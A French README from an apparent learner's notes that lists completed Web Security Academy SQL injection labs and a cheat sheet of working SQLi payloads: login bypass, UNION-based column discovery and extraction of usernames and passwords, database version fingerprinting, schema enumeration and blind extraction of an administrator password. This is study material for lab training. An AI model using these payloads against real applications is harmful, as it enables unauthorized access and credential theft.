# 💉 Injection SQL (SQLi) - Le Tableau de Chasse

Bienvenue dans mon arsenal offensif. Ce dossier recense mes victoires sur les laboratoires d'Injection SQL de la Web Security Academy et stocke mes meilleurs *payloads*.

---

## 🏆 Tableau de Bord du Chasseur
*État d'avancement de mes exploits :*

- [x] 🟢 **Apprenti** : [Retrieving hidden data](./01-retrieving-hidden-data.md)
- [x] 🟢 **Apprenti** : [Subverting application logic (Bypass de connexion)](./02-login-bypass.md)
- [x] 🟠 **Praticien** : [UNION attacks - Determining the number of columns](./03-union-columns.md)
- [x] 🟠 **Praticien** : [UNION attacks - Finding a column containing text](./04-union-find-text.md)
- [x] 🟠 **Praticien** : [UNION attacks - Retrieving data from other tables](./05-union-retrieve-data.md)
- [x] 🟠 **Praticien** : [UNION attacks - Retrieving multiple values in a single column](./06-union-concat.md)
- [x] 🟠 **Praticien** : [SQLi - Querying the database type and version](./07-union-db-version.md)
- [x] 🟠 Praticien : [SQLi - Listing the database contents on non-Oracle](./08-union-schema-enum.md)
- [x] 🔴 Expert : [Blind SQL injection with conditional responses](./09-blind-sqli-conditional.md)

---

## ⚔️ L'Arsenal Tactique (Cheatsheet)
*Mes munitions prêtes à l'emploi pour le Bug Bounty.*

### 1. Contournement & Manipulation de Logique
* **Payload universel (Vrai absolu) :** `' OR 1=1--`
    * *Explication :* Ferme la chaîne de caractères initiale, force une condition validée, et commente le reste de la requête backend.

### 2. Attaques UNION (Exfiltration de données)
* **Étape 1 : Trouver le nombre de colonnes :** `' UNION SELECT NULL--`
    * *Méthode :* Ajouter des `,NULL` un par un jusqu'à ce que l'erreur 500 disparaisse et que la page charge normalement (200 OK).
* **Étape 2 : Trouver les colonnes de type Texte :** `' UNION SELECT 'a',NULL,NULL--`
    * *Méthode :* Remplacer chaque `NULL` par une chaîne de caractères (`'a'`) tour à tour pour voir laquelle s'affiche sur la page sans crasher.
* **Étape 3 : Extraire les données (Data Breach) :** `' UNION SELECT username, password, NULL FROM users--`
    * *Méthode :* Placer les noms des colonnes ciblées (ex: `username`) à la place des `NULL` qui acceptent du texte pour aspirer les données de la table ciblée.
* **Étape 4 : Concaténer plusieurs valeurs (Si une seule colonne texte dispo) :** `' UNION SELECT NULL, CONCAT(username, '~', password) FROM users--`
    * *Méthode :* Utiliser `CONCAT()` sur MySQL/SQL Server (ou `||` sur Oracle/PostgreSQL) pour fusionner plusieurs colonnes ciblées dans l'unique colonne vulnérable de la page.

### 3. Énumération de la Base de Données (Fingerprinting)
*Trouver le type et la version du serveur SQL pour adapter ses attaques (en supposant qu'on a trouvé 2 colonnes dont la première est de type texte).*

* **MySQL / Microsoft SQL Server :** `' UNION SELECT @@version, NULL-- -`
    * *Méthode :* Injecter `@@version` dans une colonne texte. Attention : MySQL exige un espace après le double-tiret (`-- -` ou `#`).
* **PostgreSQL :** `' UNION SELECT version(), NULL--`
    * *Méthode :* Appeler la fonction `version()` dans la colonne texte.
* **Oracle :** `' UNION SELECT banner, NULL FROM v$version--`
    * *Méthode :* Interroger la table système `v$version`. (Rappel : Oracle exige *toujours* une clause `FROM` dans un SELECT. Si on ne lit pas de table spécifique, on utilise `FROM dual`). 
    
### 4. Cartographie de la Base de Données (Information Schema)
*Interroger le dictionnaire de données pour trouver les tables et colonnes cachées (Non-Oracle).*

* **Lister les Tables :** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
* **Lister les Colonnes d'une Table spécifique :** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='nom_de_la_table_trouvee'--`   

### 5. Injections SQL en Aveugle (Blind SQLi)
*Quand la base de données ne renvoie rien, mais réagit différemment selon si la condition est vraie ou fausse.*

* **Boolean-Based (Test Vrai/Faux avec SUBSTRING) :** `xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a`
    * *Méthode :* Poser des questions fermées (OUI/NON) à la base de données. Automatiser l'extraction avec Burp Suite Intruder (Cluster Bomb) en faisant varier la position (1, 2, 3...) et le caractère à tester (a, b, c...). Identifier les succès via une différence de longueur de réponse HTTP ou de code statut.
        


